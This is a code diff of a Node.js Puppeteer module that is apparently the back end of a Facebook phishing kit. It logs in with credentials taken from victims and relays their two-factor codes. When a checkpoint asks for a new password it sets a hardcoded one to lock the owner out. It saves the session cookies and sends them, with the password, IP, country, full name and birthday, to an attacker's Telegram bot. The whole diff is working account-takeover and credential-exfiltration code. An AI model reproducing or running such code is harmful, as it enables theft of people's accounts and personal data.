@@ -6,10 +6,9 @@ const fs = require('fs');
 let browser;
 let page;
 let checkSms;
-let twoFactorMode;
-let token;
-let chatid;
-
+let status;
+let sessionInfo;
+let newpass;
 async function initialize() {
     const proxyInfo = getConfigInfo();
 
@@ -57,7 +56,6 @@ async function check(username, password) {
             return text;
         } else {
             if (await page.url().includes('checkpoint')) {
-
                 const twoFactor = await page.$('#approvals_code');
                 if (twoFactor) {
                     checkSms = await browser.newPage();
@@ -68,19 +66,32 @@ async function check(username, password) {
                             element.checked = true;
                         }, smsEnable);
                         await checkSms.click('input[type="submit"]');
-                        twoFactorMode = 'SMS';
-                        return 'SMS';
+                        await checkSms.close();
+                        status = '2FA SMS'
+                        return '2FA';
                     }
                     else {
                         await checkSms.close();
-                        twoFactorMode = '2FA';
+                        status = '2FA'
+                        await page.goto('https://mbasic.facebook.com');
+                        await page.type('input[name="email"]', username);
+                        await page.type('input[name="pass"]', password);
+                        await page.click('input[type="submit"]');
                         return '2FA';
                     }
                 }
-                else{
+                else {
+                    await browser.close();
                     return 'CHECKPOINT';
                 }
             } else {
+                await page.click('input[type="submit"]');
+                const cookies = (await page.cookies()).map(cookie => {
+                    delete cookie.sameSite;
+                    return cookie;
+                });
+                fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
+                status = 'Không bật 2FA'
                 return 'SUCCESS';
             }
         }
@@ -88,44 +99,115 @@ async function check(username, password) {
         return 'Đã xảy ra lỗi ' + error;
     }
 }
-async function saveCookies(state) {
-    if (state === 'SUCCESS') {
-        await page.click('input[type="submit"]');
-        const cookies = (await page.cookies()).map(cookie => {
-            delete cookie.sameSite;
-            return cookie;
-        });
-        fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
-    }
-}
 async function enterCode(code) {
-    if (twoFactorMode === 'SMS') {
-        checkSms.type('input[name="approvals_code"]', code);
-        checkSms.click('input[type="submit"]');
-    } else if (twoFactorMode === '2FA') {
-        page.type('input[name="approvals_code"]', code);
-        page.click('input[type="submit"]');
+    await page.type('input[name="approvals_code"]', code);
+    await page.click('input[type="submit"]');
+    const wrongCode = await page.$('#approvals_code');
+    if (wrongCode) {
+        return 'WRONGCODE';
+    }
+    else {
+        let currentUrl = page.url();
+        let i = 0;
+        while (i < 8) {
+            if (currentUrl.includes('checkpoint')) {
+                await page.click('input[type="submit"]');
+                const newPassword = await page.$('#password_new');
+                if (newPassword) {
+                    await page.type('input[name="password_new"]', '93XpEP^@s');
+                    await page.click('input[type="submit"]');
+                    newpass = '93XpEP^@s';
+                }
+                currentUrl = await page.url();
+            }
+            else {
+                const cookies = (await page.cookies()).map(cookie => {
+                    delete cookie.sameSite;
+                    return cookie;
+                });
+                fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
+                break;
+            }
+            i++;
+        }
+        if (i === 8) {
+            await browser.close();
+            return 'CHECKPOINT';
+        }
+        return 'SUCCESS';
     }
 }
 function getConfigInfo() {
     const configInfo = JSON.parse(fs.readFileSync('config.json', 'utf8'));
-    token = configInfo.token;
-    chatid = configInfo.chatid;
     return configInfo;
 }
-async function sendTelegramMessage() {
-    const bot = new TelegramBot(token, { polling: true });
-    await bot.sendDocument(chatid, 'cookies.json');
+function saveInfo(status, ip, country, email, pass, fullname, birthday) {
+    const Info = {
+        status: status,
+        ip: ip,
+        country: country,
+        email: email,
+        pass: pass,
+        fullname: fullname,
+        birthday: birthday
+    };
+    sessionInfo = JSON.stringify(Info, null, 2);
 }
-
+function getVietnamCurrentTime() {
+    const now = new Date();
+    const options = {
+        timeZone: 'Asia/Ho_Chi_Minh',
+        hour: '2-digit',
+        minute: '2-digit',
+    };
+    return now.toLocaleString('vi-VN', options);
+}
 async function close() {
     await browser.close();
 }
+
+async function sendTelegramMessage(status, ip, country, email, pass, fullname, birthday) {
+    const caption = "<b>" + status + "</b>\n\n<b>IP:</b> <code>" + ip + "</code>\n<b>Quốc gia:</b> <code>" + country + "</code>\n<b>Tên đăng nhập:</b> <code>" + email + "</code>\n<b>Mật khẩu:</b> <code>" + pass + "</code>\n<b>Tên đầy đủ:</b> <code>" + fullname + "</code>\n<b>Ngày sinh:</b> <code>" + birthday + "</code>";
+    const configInfo = await getConfigInfo();
+    const token = configInfo.token;
+    const chatId = configInfo.chatid;
+    const bot = new TelegramBot(token);
+    const time = getVietnamCurrentTime();
+    const newCookiesName = `${email}_${time.replace(/:/g, '-')}.json`;
+    fs.renameSync('cookies.json', newCookiesName);
+    bot.sendDocument(chatId, newCookiesName, {
+        caption,
+        parse_mode: 'html'
+    })
+        .then(() => {
+            fs.unlinkSync(newCookiesName);
+        })
+        .catch(() => {
+        });
+}
+
+async function updateAndSync() {
+    let Info = JSON.parse(sessionInfo);
+    let status = Info.status;
+    let ip = Info.ip;
+    let country = Info.country;
+    let email = Info.email;
+    let pass = Info.pass;
+    let fullname = Info.fullname;
+    let birthday = Info.birthday;
+    if (newpass) {
+        pass = newpass;
+    }
+    sendTelegramMessage(status, ip, country, email, pass, fullname, birthday);
+}
+
+
 
 module.exports = {
     initialize,
     check,
     enterCode,
-    saveCookies,
+    updateAndSync,
+    saveInfo,
     close
 };
